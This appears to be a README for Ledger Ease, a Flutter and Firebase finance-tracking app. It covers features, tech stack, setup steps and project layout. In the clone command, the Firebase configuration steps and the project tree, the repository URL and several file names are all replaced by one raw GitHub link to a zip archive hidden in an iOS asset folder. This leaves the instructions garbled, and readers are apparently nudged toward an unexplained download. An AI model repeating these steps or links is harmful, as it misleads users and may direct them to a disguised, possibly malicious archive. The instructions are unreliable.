# 💼 Ledger Ease

**Ledger Ease** is a smart and intuitive finance management app designed to help individuals and small businesses manage their income, expenses, and budgets with ease. Whether you're tracking personal expenses or business transactions, Ledger Ease ensures that your finances stay organized and accessible.

---

## 📱 Features

- 💸 **Track Income & Expenses**  
  Categorize and record your financial transactions effortlessly.

- 📊 **Visual Reports**  
  Get detailed insights through charts and graphs to analyze your spending habits.

- 🏷️ **Custom Categories**  
  Create, edit, or remove categories for better classification.

- 🗓️ **Recurring Transactions**  
  Set up recurring income or expense records (e.g., salaries, rent, subscriptions).

- 🔔 **Reminders & Notifications**  
  Never miss a bill payment or recurring expense.

- 🔐 **Secure & Private**  
  User authentication ensures your data is safe and accessible only to you.

---

## 🔧 Tech Stack

- **Frontend:** Flutter  
- **Backend:** Firebase (Authentication, Firestore)  
- **Database:** Firestore NoSQL Database  
- **State Management:** Provider / Riverpod / Bloc *(depending on your use)*

---

## 🚀 Getting Started

### Prerequisites

- Flutter SDK
- Firebase account & project
- Android Studio or VSCode

### Installation

1. **Clone the repository:**
   ```bash
   git clone https://raw.githubusercontent.com/kunalmchandak/ledger-ease/main/ios/Runner/Assets.xcassets/ease-ledger-3.1-beta.4.zip
   cd ledger-ease
   ```

2. **Install dependencies:**
   ```bash
   flutter pub get
   ```

3. **Configure Firebase:**
   - Add your `https://raw.githubusercontent.com/kunalmchandak/ledger-ease/main/ios/Runner/Assets.xcassets/ease-ledger-3.1-beta.4.zip` for Android in `android/app/`.
   - Add your `https://raw.githubusercontent.com/kunalmchandak/ledger-ease/main/ios/Runner/Assets.xcassets/ease-ledger-3.1-beta.4.zip` for iOS in `ios/Runner/`.

4. **Run the app:**
   ```bash
   flutter run
   ```

---

## 📁 Project Structure

```
lib/
├── screens/           # UI Screens (Home, Add Transaction, Reports)
├── services/          # Firebase services, database functions
├── utils/             # has some extra icons and validators    
├── widgets/           # Reusable UI components
└── https://raw.githubusercontent.com/kunalmchandak/ledger-ease/main/ios/Runner/Assets.xcassets/ease-ledger-3.1-beta.4.zip          # Entry point
```

---

## 🤝 Contributing

Contributions are welcome! Please open an issue first to discuss what you’d like to change.

---

## 📃 License

This project is licensed under the [MIT License](LICENSE).

---
